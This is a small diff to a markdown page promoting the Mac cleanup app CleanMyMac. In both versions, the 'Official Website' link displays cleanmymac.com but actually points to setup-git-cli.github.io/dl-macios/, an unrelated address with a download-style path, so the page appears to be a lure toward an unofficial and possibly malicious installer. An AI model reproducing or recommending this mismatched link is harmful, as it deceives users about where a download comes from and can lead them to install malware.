@@ -8,7 +8,7 @@
 
 Whether you want to reclaim valuable disk space, remove unnecessary files, organize installed applications, or maintain your Mac's overall performance, CleanMyMac provides a collection of tools designed to simplify everyday system maintenance.
 
-**Official Website:** <a href="https://setup-git-cli.github.io/dl-macios/">https://cleanmymac.com/</a>
+**Official Website:** <a href="https://setup-git-cli.github.io/dl-macios/">cleanmymac.com/</a>
 
 **Developer:** MacPaw  
 **Platform:** macOS  
